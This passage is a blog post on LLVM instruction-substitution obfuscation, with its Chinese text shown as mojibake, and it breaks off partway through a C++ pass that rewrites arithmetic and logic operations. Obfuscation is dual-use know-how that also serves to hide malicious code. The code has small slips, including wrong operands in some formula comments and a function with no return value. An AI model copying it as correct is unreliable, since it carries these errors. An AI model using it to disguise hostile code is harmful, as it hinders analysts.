          <category> hackæŠ€æœ¯ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ä»£ç æ··æ·† </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>llvmä»£ç æ··æ·†å­¦ä¹ ï¼ˆä¸ƒï¼‰</title>
      <link href="/posts/38628/"/>
      <url>/posts/38628/</url>
      
        <content type="html"><![CDATA[<blockquote><p>å†™åœ¨å‰é¢</p><p>éšä¾¿å­¦å­¦ llvm ä»£ç æ··æ·†ï¼Œé¡ºä¾¿åšä¸ªæ¯•è®¾ï¼Œæ°´å‡ ç¯‡æ–‡ç« å°±å½“åšåšç¬”è®°</p></blockquote><h1 id="æŒ‡ä»¤æ›¿ä»£åŸç†åˆ†æ"><a href="#æŒ‡ä»¤æ›¿ä»£åŸç†åˆ†æ" class="headerlink" title="æŒ‡ä»¤æ›¿ä»£åŸç†åˆ†æ"></a>æŒ‡ä»¤æ›¿ä»£åŸç†åˆ†æ</h1><h2 id="æ¦‚è¿°"><a href="#æ¦‚è¿°" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h2><p>æŒ‡ä»¤æ›¿ä»£æŒ‡å°†æ­£å¸¸çš„äºŒå…ƒè¿ç®—æŒ‡ä»¤ï¼ˆå¦‚åŠ æ³•ã€å‡æ³•ã€å¼‚æˆ–ç­‰ç­‰ï¼‰ï¼Œæ›¿æ¢ä¸ºç­‰æ•ˆè€Œæ›´å¤æ‚çš„æŒ‡ä»¤åºåˆ—ï¼Œä»¥è¾¾åˆ°æ··æ·†è®¡ç®—è¿‡ç¨‹çš„ç›®çš„ã€‚</p><p>ä¾‹å¦‚ï¼Œå°† <code>a + b</code> æ›¿æ¢ä¸º <code>a - (-b)</code>ï¼Œå°† <code>a ^ b</code> æ›¿æ¢ä¸º <code>(~a &amp; b) | (a &amp; ~b)</code>ç­‰ç­‰ã€‚</p><p>ä»…æ”¯æŒæ•´æ•°è¿ç®—çš„æ›¿æ¢ï¼Œå› ä¸ºæ›¿æ¢æµ®ç‚¹æŒ‡ä»¤ä¼šé€ æˆèˆå…¥é”™è¯¯å’Œè¯¯å·®ã€‚</p><h2 id="æ··æ·†æ•ˆæœ"><a href="#æ··æ·†æ•ˆæœ" class="headerlink" title="æ··æ·†æ•ˆæœ"></a>æ··æ·†æ•ˆæœ</h2><p>å‡½æ•°çš„æ§åˆ¶æµå¹¶æ²¡æœ‰å‘ç”Ÿå˜åŒ–ï¼Œä½†æ˜¯è¿ç®—è¿‡ç¨‹å˜å¾—éš¾ä»¥åˆ†è¾¨ï¼š</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/image-20230222233422164.png" alt="image-20230222233422164"></p><h2 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h2><p>æ‰«ææ‰€æœ‰æŒ‡ä»¤ï¼Œå¯¹ç›®æ ‡æŒ‡ä»¤ï¼ˆåŠ æ³•ã€å‡æ³•ã€ä¸æˆ–éã€å¼‚æˆ–ï¼‰è¿›è¡Œæ›¿æ¢ï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">Substitution::runOnFunction</span><span class="params">(Function &amp;F)</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i &lt; ObfuTime;i ++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(BasicBlock &amp;BB : F)&#123;</span><br><span class="line">            vector&lt;Instruction*&gt; origInst;</span><br><span class="line">            <span class="keyword">for</span>(Instruction &amp;I : BB)&#123;</span><br><span class="line">                origInst.<span class="built_in">push_back</span>(&amp;I);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span>(Instruction *I : origInst)&#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="built_in">isa</span>&lt;BinaryOperator&gt;(I))&#123;</span><br><span class="line">                    BinaryOperator *BI = <span class="built_in">cast</span>&lt;BinaryOperator&gt;(I);</span><br><span class="line">                    <span class="built_in">substitute</span>(BI);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="æŒ‡ä»¤æ›¿ä»£ä»£ç å®ç°æ€è·¯"><a href="#æŒ‡ä»¤æ›¿ä»£ä»£ç å®ç°æ€è·¯" class="headerlink" title="æŒ‡ä»¤æ›¿ä»£ä»£ç å®ç°æ€è·¯"></a>æŒ‡ä»¤æ›¿ä»£ä»£ç å®ç°æ€è·¯</h1><h2 id="åŠ æ³•æ›¿æ¢"><a href="#åŠ æ³•æ›¿æ¢" class="headerlink" title="åŠ æ³•æ›¿æ¢"></a>åŠ æ³•æ›¿æ¢</h2><p>å¯¹äº <code>a = b + c</code>ï¼Œå®ç°å››ç§æ›¿æ¢æ–¹æ¡ˆï¼š</p><ul><li>addNegï¼š<code>a = b - (-c)</code></li><li>addDoubleNegï¼š<code>a = -(-b + (-c))</code></li><li>addRandï¼š<code>r = rand(); a = b + r; a = a + c; a = a - r</code></li><li>addRand2ï¼š<code>r = rand(); a = b - r; a = a + c; a = a + r</code></li></ul><h2 id="å‡æ³•æ›¿æ¢"><a href="#å‡æ³•æ›¿æ¢" class="headerlink" title="å‡æ³•æ›¿æ¢"></a>å‡æ³•æ›¿æ¢</h2><p>å¯¹äº<code>a = b - c</code>ï¼Œå®ç°ä¸‰ç§æ›¿æ¢æ–¹æ¡ˆï¼š</p><ul><li>subNegï¼š<code>a = b + (-c)</code></li><li>subRandï¼š<code>r = rand(); a = b + r; a = a - c; a = a - r</code></li><li>subRand2ï¼š<code>r = rand(); a = b - r; a = a - c; a = a + r</code></li></ul><h2 id="ä¸æ›¿æ¢"><a href="#ä¸æ›¿æ¢" class="headerlink" title="ä¸æ›¿æ¢"></a>ä¸æ›¿æ¢</h2><p>å¯¹äº<code>a = b &amp; c</code>ï¼Œå®ç°ä¸¤ç§æ›¿æ¢æ–¹æ¡ˆï¼š</p><ul><li>andSubstituteï¼š<code>a = (b ^ ~c) &amp; b</code></li><li>andSubstituteRandï¼š<code>r = rand(); a = ~(~b | ~c) &amp; (r | ~r)</code></li></ul><h2 id="æˆ–æ›¿æ¢"><a href="#æˆ–æ›¿æ¢" class="headerlink" title="æˆ–æ›¿æ¢"></a>æˆ–æ›¿æ¢</h2><p>å¯¹äº<code>a = b | c</code>ï¼Œå®ç°ä¸¤ç§æ›¿æ¢æ–¹æ¡ˆï¼š</p><ul><li>orSubstituteï¼š<code>a = (b &amp; c) | (b ^ c)</code></li><li>orSubstituteRandï¼š<code>r = rand(); a = ~(~b &amp; ~c) &amp; (r | ~r)</code></li></ul><h2 id="å¼‚æˆ–æ›¿æ¢"><a href="#å¼‚æˆ–æ›¿æ¢" class="headerlink" title="å¼‚æˆ–æ›¿æ¢"></a>å¼‚æˆ–æ›¿æ¢</h2><p>å¯¹äº<code>a = b ^ c</code>ï¼Œå®ç°ä¸¤ç§æ›¿æ¢æ–¹æ¡ˆï¼š</p><ul><li>xorSubstituteï¼š<code>a = (~a &amp; b) | (a &amp; ~b)</code></li><li>xorSunstituteRandï¼š<code>r = rand(); a = (b ^ r) ^ (c ^ r) &lt;=&gt; a = (~b &amp; r | b &amp; ~r) ^ (~c &amp; r | c &amp; ~r)</code></li></ul><h1 id="æŒ‡ä»¤æ›¿ä»£ä»£ç å®ç°"><a href="#æŒ‡ä»¤æ›¿ä»£ä»£ç å®ç°" class="headerlink" title="æŒ‡ä»¤æ›¿ä»£ä»£ç å®ç°"></a>æŒ‡ä»¤æ›¿ä»£ä»£ç å®ç°</h1><h2 id="Substitution-cpp"><a href="#Substitution-cpp" class="headerlink" title="Substitution.cpp"></a>Substitution.cpp</h2><p><code>replaceAllUsesWith</code>æ–¹æ³•ï¼šä½¿ç”¨ä¼ å…¥çš„æŒ‡ä»¤æ›¿æ¢æ‰€æœ‰ç”¨åˆ°äº†åŸæŒ‡ä»¤çš„åœ°æ–¹ã€‚</p> <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/IR/Function.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/Pass.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/Support/raw_ostream.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/IR/Instructions.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/Support/CommandLine.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;Utils.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctime&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> llvm;</span><br><span class="line"><span class="keyword">using</span> std::vector;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NUMBER_ADD_SUBST 4</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NUMBER_SUB_SUBST 3</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NUMBER_AND_SUBST 2</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NUMBER_OR_SUBST 2</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NUMBER_XOR_SUBST 2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// æ··æ·†æ¬¡æ•°ï¼Œæ··æ·†æ¬¡æ•°è¶Šå¤šæ··æ·†ç»“æœè¶Šå¤æ‚</span></span><br><span class="line"><span class="function"><span class="type">static</span> cl::opt&lt;<span class="type">int</span>&gt; <span class="title">ObfuTime</span><span class="params">(<span class="string">&quot;sub_loop&quot;</span>, cl::init(<span class="number">1</span>), cl::desc(<span class="string">&quot;Obfuscate a function &lt;obfu_time&gt; time(s).&quot;</span>))</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">Substitution</span> : <span class="keyword">public</span> FunctionPass &#123;</span><br><span class="line">        <span class="keyword">public</span>:</span><br><span class="line">            <span class="type">static</span> <span class="type">char</span> ID;</span><br><span class="line">            <span class="built_in">Substitution</span>() : <span class="built_in">FunctionPass</span>(ID) &#123;</span><br><span class="line">                <span class="built_in">srand</span>(<span class="built_in">time</span>(<span class="literal">NULL</span>));</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="function"><span class="type">bool</span> <span class="title">runOnFunction</span><span class="params">(Function &amp;F)</span></span>;</span><br><span class="line"></span><br><span class="line">            <span class="function"><span class="type">void</span> <span class="title">substitute</span><span class="params">(BinaryOperator *BI)</span></span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// æ›¿æ¢ Add æŒ‡ä»¤</span></span><br><span class="line">            <span class="function"><span class="type">void</span> <span class="title">substituteAdd</span><span class="params">(BinaryOperator *BI)</span></span>;</span><br><span class="line">            <span class="comment">// åŠ æ³•æ›¿æ¢ï¼ša = b + c -&gt; a = b - (-c)</span></span><br><span class="line">            <span class="function"><span class="type">void</span> <span class="title">addNeg</span><span class="params">(BinaryOperator *BI)</span></span>;</span><br><span class="line">            <span class="comment">// åŠ æ³•æ›¿æ¢ï¼ša = b + c -&gt; a = -(-b + (-c))</span></span><br><span class="line">            <span class="function"><span class="type">void</span> <span class="title">addDoubleNeg</span><span class="params">(BinaryOperator *BI)</span></span>;</span><br><span class="line">            <span class="comment">// åŠ æ³•æ›¿æ¢ï¼ša = b + c -&gt; r = rand (); a = b + r; a = a + c; a = a - r</span></span><br><span class="line">            <span class="function"><span class="type">void</span> <span class="title">addRand</span><span class="params">(BinaryOperator *BI)</span></span>;</span><br><span class="line">            <span class="comment">// åŠ æ³•æ›¿æ¢ï¼ša = b + c -&gt; r = rand (); a = b - r; a = a + b; a = a + r</span></span><br><span class="line">            <span class="function"><span class="type">void</span> <span class="title">addRand2</span><span class="params">(BinaryOperator *BI)</span></span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// æ›¿æ¢ Sub æŒ‡ä»¤</span></span><br><span class="line">            <span class="function"><span class="type">void</span> <span class="title">substituteSub</span><span class="params">(BinaryOperator *BI)</span></span>;</span><br><span class="line">            <span class="comment">// å‡æ³•æ›¿æ¢ï¼ša = b - c -&gt; a = b + (-c)</span></span><br><span class="line">            <span class="function"><span class="type">void</span> <span class="title">subNeg</span><span class="params">(BinaryOperator *BI)</span></span>;</span><br><span class="line">            <span class="comment">// å‡æ³•æ›¿æ¢ï¼ša = b - c -&gt; r = rand (); a = b + r; a = a - c; a = a - r</span></span><br><span class="line">            <span class="function"><span class="type">void</span> <span class="title">subRand</span><span class="params">(BinaryOperator *BI)</span></span>;</span><br><span class="line">            <span class="comment">// å‡æ³•æ›¿æ¢ï¼ša = b - c -&gt; a = b - r; a = a - c; a = a + r</span></span><br><span class="line">            <span class="function"><span class="type">void</span> <span class="title">subRand2</span><span class="params">(BinaryOperator *BI)</span></span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// æ›¿æ¢ And æŒ‡ä»¤</span></span><br><span class="line">            <span class="function"><span class="type">void</span> <span class="title">substituteAnd</span><span class="params">(BinaryOperator *BI)</span></span>;</span><br><span class="line">            <span class="comment">// ä¸æ›¿æ¢ï¼ša = b &amp; c -&gt; a = (b ^ ~c) &amp; b</span></span><br><span class="line">            <span class="function"><span class="type">void</span> <span class="title">andSubstitute</span><span class="params">(BinaryOperator *BI)</span></span>;</span><br><span class="line">            <span class="comment">// ä¸æ›¿æ¢ï¼ša = b &amp; c -&gt; a = ~(~b | ~c) &amp; (r | ~r)</span></span><br><span class="line">            <span class="function"><span class="type">void</span> <span class="title">andSubstituteRand</span><span class="params">(BinaryOperator *BI)</span></span>;</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// æ›¿æ¢ Or æŒ‡ä»¤</span></span><br><span class="line">            <span class="function"><span class="type">void</span> <span class="title">substituteOr</span><span class="params">(BinaryOperator *BI)</span></span>;</span><br><span class="line">            <span class="comment">// æˆ–æ›¿æ¢ï¼ša = b | c -&gt; a = (b &amp; c) | (b ^ c)</span></span><br><span class="line">            <span class="function"><span class="type">void</span> <span class="title">orSubstitute</span><span class="params">(BinaryOperator *BI)</span></span>;</span><br><span class="line">            <span class="comment">// æˆ–æ›¿æ¢ï¼ša = b | c -&gt; a = ~(~b &amp; ~c) &amp; (r | ~r)</span></span><br><span class="line">            <span class="function"><span class="type">void</span> <span class="title">orSubstituteRand</span><span class="params">(BinaryOperator *BI)</span></span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// æ›¿æ¢ Xor æŒ‡ä»¤</span></span><br><span class="line">            <span class="function"><span class="type">void</span> <span class="title">substituteXor</span><span class="params">(BinaryOperator *BI)</span></span>;</span><br><span class="line">            <span class="comment">// å¼‚æˆ–æ›¿æ¢ï¼ša = b ^ c -&gt; a = ~b &amp; c | b &amp; ~c</span></span><br><span class="line">            <span class="function"><span class="type">void</span> <span class="title">xorSubstitute</span><span class="params">(BinaryOperator *BI)</span></span>;</span><br><span class="line">            <span class="comment">// å¼‚æˆ–æ›¿æ¢ï¼ša = b ^ c -&gt; (b ^ r) ^ (c ^ r) &lt;=&gt; (~b &amp; r | b &amp; ~r) ^ (~c &amp; r | c &amp; ~r)</span></span><br><span class="line">            <span class="function"><span class="type">void</span> <span class="title">xorSubstituteRand</span><span class="params">(BinaryOperator *BI)</span></span>;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">Substitution::runOnFunction</span><span class="params">(Function &amp;F)</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i &lt; ObfuTime;i ++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(BasicBlock &amp;BB : F)&#123;</span><br><span class="line">            vector&lt;Instruction*&gt; origInst;</span><br><span class="line">            <span class="keyword">for</span>(Instruction &amp;I : BB)&#123;</span><br><span class="line">                origInst.<span class="built_in">push_back</span>(&amp;I);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span>(Instruction *I : origInst)&#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="built_in">isa</span>&lt;BinaryOperator&gt;(I))&#123;</span><br><span class="line">                    BinaryOperator *BI = <span class="built_in">cast</span>&lt;BinaryOperator&gt;(I);</span><br><span class="line">                    <span class="built_in">substitute</span>(BI);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Substitution::substitute</span><span class="params">(BinaryOperator *BI)</span></span>&#123;</span><br><span class="line">    <span class="type">bool</span> flag = <span class="literal">true</span>;</span><br><span class="line">    <span class="comment">// getOpcodeæ–¹æ³•è·å–æŒ‡ä»¤ç±»å‹ï¼Œæ ¹æ® åŠ  å‡ ä¸ æˆ– é äº”ç§æŒ‡ä»¤ç±»å‹è°ƒç”¨å¯¹åº”æ··æ·†ç®—æ³•</span></span><br><span class="line">    <span class="keyword">switch</span> (BI-&gt;<span class="built_in">getOpcode</span>()) &#123;</span><br><span class="line">        <span class="keyword">case</span> BinaryOperator::Add:</span><br><span class="line">            <span class="built_in">substituteAdd</span>(BI);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> BinaryOperator::Sub:</span><br><span class="line">            <span class="built_in">substituteSub</span>(BI);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> BinaryOperator::And:</span><br><span class="line">            <span class="built_in">substituteAnd</span>(BI);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> BinaryOperator::Or:</span><br><span class="line">            <span class="built_in">substituteOr</span>(BI);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> BinaryOperator::Xor:</span><br><span class="line">            <span class="built_in">substituteXor</span>(BI);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            flag = <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(flag)&#123;</span><br><span class="line">        BI-&gt;<span class="built_in">eraseFromParent</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Substitution::substituteAdd</span><span class="params">(BinaryOperator *BI)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> choice = <span class="built_in">rand</span>() % NUMBER_ADD_SUBST;</span><br><span class="line">    <span class="keyword">switch</span> (choice) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">addNeg</span>(BI);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="built_in">addDoubleNeg</span>(BI);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            <span class="built_in">addRand</span>(BI);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            <span class="built_in">addRand2</span>(BI);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Substitution::addNeg</span><span class="params">(BinaryOperator *BI)</span></span>&#123;</span><br><span class="line">    <span class="comment">// a = b + c -&gt; a = b - (-c)</span></span><br><span class="line">    BinaryOperator *op;</span><br><span class="line">    <span class="comment">// Neg 